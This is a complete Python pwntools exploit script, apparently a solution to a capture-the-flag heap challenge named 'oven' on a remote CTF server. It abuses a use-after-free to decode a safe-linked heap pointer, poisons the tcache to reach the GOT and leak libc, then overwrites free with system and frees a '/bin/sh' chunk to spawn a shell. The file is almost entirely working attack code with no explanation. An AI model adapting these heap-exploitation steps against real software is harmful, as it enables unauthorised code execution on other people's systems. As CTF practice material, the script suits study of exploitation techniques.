#!/usr/bin/python3

from pwn import *
p = remote("0.cloud.chals.io", 21580)
#p = process("./oven_patched")
elf = ELF("./oven_patched", checksec = 0)
libc = elf.libc

c = lambda a : p.sendlineafter(b"> ", str(a))
s = lambda a: p.send(a)
sl = lambda a: p.sendline(a)
sa = lambda a, b: p.sendafter(a, b)
sla = lambda a, b: p.sendlineafter(a, b)
ru = lambda a: p.recvuntil(a)
d = lambda : gdb.attach(p, gdbscript = """
        set resolve-heap-via-heuristic on
        """)
def decrypt(cipher):
    key = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain
def alpha(heap, target):
    return target ^ (heap >> 0xc)
def bake(idx, size, data):
    c(1)
    sla(b"Slot: ", str(idx))
    sla(b"Size: ", str(size))
    sa(b"recipe: ", data)

def check(idx):
    c(2)
    sla(b"Slot: ", str(idx))

def modify(idx, data):
    c(3)
    sla(b"Slot: ", str(idx))
    sa(b"recipe: ", data)

def delete(idx):
    c(4)
    sla(b"Slot: ", str(idx))

def exploit():
    bake(0, 0x10, b"A" * 0x10)
    bake(1, 0x10, b"B" * 0x10)
    bake(2, 0x10, b"C" * 0x10)
    delete(0)
    delete(1)
    check(1)
    heap_leak = u64(p.recvline().strip(b"\n").ljust(8, b"\x00"))
    heap_leak = decrypt(heap_leak)- 0x2a0
    print(hex(heap_leak))
    modify(1, p64(alpha(heap_leak, elf.got.atoi + 0x10)))
    bake(0, 0x10, b"A"* 0x10)
    bake(1, 0x10, b"C" * 0x10)
    check(1)
    p.recv(0x10)
    libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.sym._IO_2_1_stdout_
    log.info(f"libc @ {hex(libc.address)}")
    bake(2, 0x20, b"A" * 0x20)
    bake(3, 0x20, b"B" * 0x20)
    delete(2)
    delete(3)
    modify(3, p64(alpha(heap_leak, elf.got.free)))
    bake(2, 0x20, b"/bin/sh\x00" + b"A" * (0x20 - 8))
    bake(3, 0x20, p64(libc.sym.system) + p64(libc.sym.puts) + p64(libc.sym.fread) + p64(0x401066))
    #d()
    p.interactive()
exploit()
